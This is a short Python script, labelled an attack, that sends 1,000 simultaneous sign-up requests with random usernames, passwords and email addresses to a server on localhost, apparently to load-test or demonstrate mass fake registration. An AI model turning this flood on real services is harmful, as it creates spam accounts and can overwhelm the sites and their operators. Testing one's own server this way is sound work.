import requests
from string import ascii_lowercase, ascii_uppercase
from random import choice 
from time import sleep 
from concurrent.futures import ThreadPoolExecutor


def createAccount():
    print('Request Sent')
    targetUrl = 'http://localhost:8080/api/sign-up'
    
    # generate random username and password 
    username = ''.join([choice(ascii_uppercase)] + [choice(ascii_lowercase) for _ in range(10)])
    password = ''.join([choice(ascii_uppercase)] + [choice(ascii_lowercase) for _ in range(20)] + ['1#'])
    email = ''.join([choice(ascii_lowercase) for _ in range(10)] + ['@gmail.com']) 
    
    # send request to /sign-up endpoint 
    response = requests.post(targetUrl, json = {'username': username, 'password': password, 'email': email})
    
    


if __name__ == '__main__':
    print('Starting attack in 5 seconds ...')
    sleep(5)
    
    # send requests asynchronously so they arrive at the server
    #at the same time 
    
    requestNumber = 1000
    
    with ThreadPoolExecutor(requestNumber) as executor:
        _ = [executor.submit(createAccount) for _ in range(requestNumber)]
    
    
    